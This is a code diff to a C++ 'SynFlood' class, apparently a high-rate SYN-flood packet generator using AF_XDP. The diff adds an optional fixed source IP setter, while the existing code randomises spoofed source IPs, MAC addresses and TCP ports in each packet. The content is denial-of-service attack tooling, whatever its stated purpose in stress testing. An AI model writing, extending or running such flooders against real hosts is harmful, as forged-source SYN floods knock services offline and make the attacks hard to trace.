@@ -17,8 +17,9 @@ volatile bool SynFlood::running = true;
 struct Channel SynFlood::channelList[MAX_QUEUE];
 __thread long SynFlood::sendCount = 0;
 uint64_t SynFlood::packetCount = 0;
-in_addr_t SynFlood::dstIp;
-uint16_t SynFlood::dstPort;
+in_addr_t SynFlood::dstIp = 0;
+uint16_t SynFlood::dstPort = 0;
+in_addr_t SynFlood::srcIp = 0;
 uint8_t SynFlood::dstMac[ETH_ALEN];
 uint8_t SynFlood::srcMac[ETH_ALEN];
 long SynFlood::rate = 0;
@@ -43,6 +44,15 @@ void SynFlood::setDstAddr(const char *ip, uint16_t port)
 {
     dstIp = inet_addr(ip);
     dstPort = htons(port);
+}
+
+void SynFlood::setSrcAddr(const char *ip)
+{
+    if (ip && ip[0]) {
+        srcIp = inet_addr(ip);
+    } else {
+        srcIp = 0;
+    }
 }
 
 int SynFlood::setDstMac(const char *mac)
@@ -130,7 +140,7 @@ void SynFlood::updatePacket(struct xdp_frame *frame)
     *(uint32_t *)ethhdr->h_source = rand();
     *(uint16_t *)(ethhdr->h_source + 4) = rand() & 0xFFFF;
 
-    iphdr->saddr = rand(); 
+    iphdr->saddr = srcIp ? srcIp : rand(); 
     iphdr->check = xdp_ipv4_checksum(iphdr);
 
     tcphdr->source = xdp_htons(rand() & 0xFFFF);
